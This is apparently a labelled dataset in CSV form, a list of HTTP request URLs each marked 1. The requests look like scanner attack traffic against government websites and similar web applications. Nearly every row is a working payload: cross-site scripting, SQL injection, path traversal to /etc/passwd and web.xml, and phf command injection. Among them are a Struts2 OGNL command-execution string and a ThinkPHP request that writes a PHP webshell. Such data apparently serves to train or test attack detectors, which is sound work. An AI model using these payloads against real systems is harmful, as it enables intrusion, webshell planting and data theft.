request_url,status
/HBSC/Services/huanbaoju/message_zx_article.jsp?ID=21218%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Frpsnl.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E,1
/HBSC/Services/huanbaoju/message_zx.jsp?var=</script>[url=jav\\x61scr\\x69pt%26%23x3A;sadmfo(6501)]6501[/url],1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=</script>[url=jav\\x61scr\\x69pt%26colon;sadmfo(6052)]6052[/url]&order=rela,1
/HBSC/Search/Result.jsp?query=atestu&order=</script>[url=jav\\x61scr\\x69pt%26%23x3A;sadmfo(6417)]6417[/url]&indexid=26&id=26&site=24,1
/HBSC/Services/AttachDownLoad.jsp?id=586546,1
/HBSC/Services/huanbaoju/message_sf.jsp?&#60;/script&#62;&#60;img%20src=gxgvlk%20onerror=gxgvlk(6743)&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;img+src=gxgvlk+onerror=gxgvlk(6208)&#62;&indexid=26&site=24&id=0,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt%26colon;gxgvlk(6208)]6208[/url]&indexid=26&site=24&id=0,1
/HBSC/Search/Result.jsp?query=atestu&indexid=26&site=24&id=0,1
/HBSC/Search/Result.jsp?button=??????%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fmpbvz.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&indexid=26&site=24&id=26&query=atestu&order=rela,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.lekabwwx.com%2Fkjorl.html%22&#37;3E&query=atestu&order=rela,1
/HBSC/Search/Result.jsp?site=24&indexid=26&button=??????&query=atestu&id=26&order=rela,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&time=</script>[url=jav\\x61scr\\x69pt:gxgvlk(6349)]6349[/url]&query=atestu&id=26,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;svg/%20onload=gxgvlk(6208)&#62;&indexid=26&site=24&id=0,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&query=atestu&order=rela%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.wyynlrmi.com%2Fixdru.html%22&#37;3E,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&time=all&query=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fhwvze.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&id=26,1
/HBSC/Services/huanbaoju/message_sf.jsp?var=&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:gxgvlk(6485)&#62;,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fdifei.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&time=month&query=atestu&order=rela,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;audio%20src=gxgvlk%20onerror=gxgvlk(6664)&#62;&order=time&indexid=26&id=26&site=24,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&title=atestu&author=atestu&site=24&content=atestu&query=&#60;/script&#62;&#60;img/%20src=gxgvlk%20onerror=gxgvlk(6130)&#62;,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt:gxgvlk(6114)]6114[/url]&time=quarter&indexid=26&id=26&site=24,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&title=atestu&author=atestu&site=24&content=atestu&query=&#60;/script&#62;&#60;svg/%20onload=gxgvlk(6130)&#62;,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;img+src=gxgvlk+onerror=gxgvlk(6114)&#62;&time=quarter&indexid=26&id=26&site=24,1
/HBSC/Search/Result.jsp?query=&#60;/script&#62;&#60;object+data=jav\\x61scr\\x69pt:gxgvlk(6664)&#62;&order=time&indexid=26&id=26&site=24,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.ecgfyfgr.com%2Fsfstz.html%22&#37;3E&query=atestu&order=rela,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=26%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3Ca%20href%3D%27%2Fcnmub.html%27&#37;3ELinkInjTest&#37;3C%2Fa&#37;3E&id=26&site=24,1
/HBSC/Search/Result.jsp?query=</script>[url=jav\\x61scr\\x69pt%26colon;gxgvlk(6216)]6216[/url]&indexid=&site=24,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=rela%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.ixaalmdw.com%2Ffdvds.html%22&#37;3E,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=26%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.nakvijwq.com%2Fwyvkp.html%22&#37;3E&id=26&site=24,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=26&id=26&site=24%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.qiypsbxc.com%2Fbkmfe.html%22&#37;3E,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=26%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.fzmcslwn.com%2Fjbshs.html%22&#37;3E&id=26&site=24,1
/HBSC/Search/Result.jsp?query=atestu&order=time&indexid=26&id=26&site=24%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fiframe&#37;3E&#37;3CIFRAME+SRC%3D%22http%3A%2F%2Fwww.xwzsifij.com%2Fhkbay.html%22&#37;3E,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&title=atestu%23%2A%2F--&#37;3E%27%22%29%3B&#37;3E&#37;3C%2Fscript&#37;3E&#37;3C%2Fstyle&#37;3E&#37;3C%2Ftitle&#37;3E&#37;3C%2Ftextarea&#37;3E&#37;3C%2Fframe&#37;3E&#37;3CFRAME+SRC%3D%22http%3A%2F%2Fwww.yqforksg.com%2Fjsmuk.html%22&#37;3E&author=atestu&site=24&content=atestu&query=atestu,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=&#60;/script&#62;&#60;svg/%20onload=gxgvlk(6727)&#62;&query=atestu&order=rela,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=&#62;&#60;atestu&#62;xss&#60;/atestu&#62;,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=&#60;/script&#62;&#60;img+src=gxgvlk+onerror=gxgvlk(6906)&#62;,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=</script>[url=jav\\x61scr\\x69pt%26colon;gxgvlk(6906)]6906[/url],1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=&#60;/script&#62;&#60;img/%20src=gxgvlk%20onerror=gxgvlk(6906)&#62;,1
/HBSC/Search/AdvanceResult.jsp?startdate=2019-1-4&enddate=2019-1-4&author=atestu&title=atestu&site=24&content=atestu&query=atestu,1
/HBSC/Search/Result.jsp?button=??????&indexid=26&site=24&id=26&time=month&query=atestu&order=&#60;/script&#62;&#60;input%20autofocus%20onfocus=gxgvlk(6906)&#62;,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/asaancart/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../winnt/win.ini%00&file=frontend.js&language=en,1
/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
/cgi-bin/htsearch?exclude=%60/etc/passwd%60,1
/scripts/calendar_admin.pl?config=|cat%20/etc/passwd|,1
/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=2,1
/frontend/js.php?module=../../../../../../../../../../../../../../../../../../boot.ini%00&file=frontend.js&language=en,1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../boot.ini%00&file=frontend.js&language=en,1
/cgi-bin/frontend/js.php?module=../../../../../../../../../../../../../../../../../../winnt/win.ini%00&file=frontend.js&language=en,1
/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini,1
/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/htsearch?exclude=%60/etc/passwd%60,1
/frontend/js.php?module=../../../../../../../../../../../../../../../../../../winnt/win.ini%00&file=frontend.js&language=en,1
/asaancart/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../boot.ini%00&file=frontend.js&language=en,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=2,1
/jcms_public/jcms_files/jcms1/web3/site/module/sitesearch/index.jsp?keyword=vc_title&columnid=0&keyvalue=1&webid=3&modalunitid=1187&classword=%2Fetc%2Fpasswd&currpage=,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServer,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=3,1
/template/jcms/m_5_7/replace/export.jsp?filename=c:/boot.ini&savename=pass,1
/images/jcms2.4/m_5_1/attach_dwn.jsp?filename=boot.ini&fpath=c:/boot.ini,1
/zhiding2.action?lanmuid=c:/windows/win.ini,1
/user.php?act=login,1
"/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23",1
/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lyrxc.php&content=%3C?php%20assert($_REQUEST%5B%22P@a_gov5%22%5D);?%3Eysydjsjxbei37,1
/index.php?lang=Cn&index=0000,1
/user.php?act=login,1
/eap/64.news.list?newstimeend=&newstitle=WEB-INF%2Fweb.xml&page=&newstimestart=,1
/eap/64.news.list?newstimeend=WEB-INF%2Fweb.xml&newstitle=&page=&newstimestart=,1
/HBSC/Services/500.jsp?key=018002001&page=1,1
/eap/64.news.list?newstimeend=&newstitle=%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29xIrA%29&page=&newstimestart=,1
/eap/64.news.list?newstimeend=&newstitle=%29%20AND%20%28SELECT%209230%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71787a7871%2C%28SELECT%20%28ELT%289230%3D9230%2C1%29%29%29%2C0x7171627171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%285206%3D5206&page=&newstimestart=,1
/eap/17.news.commentlist?news_id=5198&member_email=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&member_annex_file=&comments_content=&is_open=0&member_id=&member_address=&member_phone=,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20MGdG,1
/HBSC/Services/500.jsp?key=018002005&page=1,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20qyxX,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/asaancart/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini,1
/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=1,1
/290.snipet.block.dhtml?debug=command&expression=%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'ipconfig'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B10000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close(),1
"/148.infoswap.detail.dhtml?info_id=17ac7b6722ee405f9ba2c382a6c1670b%27%20and%201%3D0%20uNion%20All%20Select%20NULL,NULL,chr%2851%29%26chr%2857%29%26chr%2855%29%26chr%2853%29%26chr%2848%29%26chr%2898%29%26chr%2897%29%26chr%2848%29%26chr%2851%29,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20MSysAccessObjects%16",1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=3,1
/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=dzxy&keywords=../../WEB-INF/web.xml%00,1
/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=dzxy&keywords=../../../../../../WEB-INF/web.xml?,1
/searchServer/search/app/dzxy/index.html?serviceId=../../../../../../WEB-INF/web.xml&appId=dzxy&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=../WEB-INF/web.xml?&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=../../../WEB-INF/web.xml&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=../../../../WEB-INF/web.xml%00&appId=dzxy&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=../WEB-INF/web.xml%00&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=../WEB-INF/web.xml&appId=dzxy&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=dzxy&keywords=../WEB-INF/web.xml%00,1
/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=../../WEB-INF/web.xml?&keywords=è¯·è¾å/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=dzxy&keywords=../../../WEB-INF/web.xml?,1
/searchServer/search/app/dzxy/index.html?serviceId=dzxy&appId=dzxy&keywords=../../WEB-INF/web.xml,1
"/searchServer/jphoto/objectbox/selectx_search.jsp?spell=-1'%20UNION%20ALL%20SELECT%20NULL,chr(72)||chr(97)||chr(110)||chr(119)||chr(101)||chr(98)||chr(95)||chr(97)||chr(108)||chr(108)||chr(118)||chr(101)||chr(114)||chr(115)||chr(105)||chr(111)||chr(110)||chr(95)||chr(115)||chr(113)||chr(108)||chr(105),NULL%20FROM%20DUAL--%20",1
"/searchServer/jis/objectbox/selectx_userlist.jsp?fn_Keywords=-1'%20UNION%20ALL%20SELECT%20NULL,char(72)%2bchar(97)%2bchar(110)%2bchar(119)%2bchar(101)%2bchar(98)%2bchar(95)%2bchar(97)%2bchar(108)%2bchar(108)%2bchar(118)%2bchar(101)%2bchar(114)%2bchar(115)%2bchar(105)%2bchar(111)%2bchar(110)%2bchar(95)%2bchar(115)%2bchar(113)%2bchar(108)%2bchar(105),NULL--%20",1
/searchServer/cms/article/readPDF.jsp?openURL=a|WEB-INF/web.xml,1
/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployer:service%3DBSHDeployer,1
/index.php?m=content&c=index&a=lists&catid=482/today/today/200707/article_13246%20AND%20%28SELECT%203422%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71767a7671%2C%28SELECT%20%28ELT%283422%3D3422%2C1%29%29%29%2C0x7176767671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20Vhsy.html,1
lx=Qianbo_about&id=1%20and%201=2%20union%20select%20password%20from%20qianbo_admin,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=3,1
ticle.jsp?SiteID=96&aid=474ecb25-96b4-47ba-bcff-6a3b9e64d0e8,1
/index.php?m=content&c=index&a=lists&catid=482/today/today/200707/article_13246%20UNION%20ALL%20SELECT%20NULL--%20Fcli.html,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=4,1
/index.php?m=content&c=index&a=lists&catid=482/today/today/200707/article_13246%20AND%206265%3D%28SELECT%206265%20FROM%20PG_SLEEP%285%29%29.html,1
/user.php?act=login,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=2,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;,1
/calendar_admin.pl?config=|cat%20/etc/passwd|,1
/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/htsearch?exclude=%60/etc/passwd%60,1
/HBSC/Search/Result.jsp?site=1&query=88888&Submit=%CB%D1%CB%F7&#37;3Cscript%20src=http:/xxooxxoo.js&#37;3E&#37;3C/script&#37;3E,1
/HBSC/Services/cangzhougovcn/zwzx/ggzyjy_list_index_cq.jsp?key=018003001&#37;3Ca%20href%3D%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2349%26%2350%26%2351%26%2352%26%2353%26%2341&#37;3ETEST&#37;3C/a&#37;3E,1
/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=chuos.php&content=%3C?php%20assert($_REQUEST%5B%22P@a_gov5%22%5D);?%3Eysydjsjxbei37,1
/.git/info/refs?service=git-upload-pack,1
/HBSC/Services/cangzhougovcn/zmhd_mailbox.jsp?page=1&SiteID=1&#37;3Ciframe%20SRC=javascript:alert(42873)&#37;3E,1
"page=1')%20AND(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e,unhex(Hex(cast(database()%20as%20char))),0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20AND%20('eEye'='eEye",1
"page=1%20AND(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e,unhex(Hex(cast(database()%20as%20char))),0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)",1
"q=88888')%20OR%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e,unhex(Hex(cast(database()%20as%20char))),0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20OR%20('eEye'='eye",1
"q=88888'%20OR%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e,unhex(Hex(cast(database()%20as%20char))),0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20OR%20'zl'='lz",1
filename=/etc/passwd&savename=webscan.txt,1
id=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd,1
filename=/etc/passwd&savename=webscan.txt,1
FileFullPath=%5Cetc%5Cpasswd&FileName=passwd,1
action=copy&SrcPicPath=/WEB-INF/web.xml&PicPath=/cms/web/reer.txt,1
loginname=admin'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd,1
itemtype=6&depNO=1122'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122&approveName=&nowPage=3,1
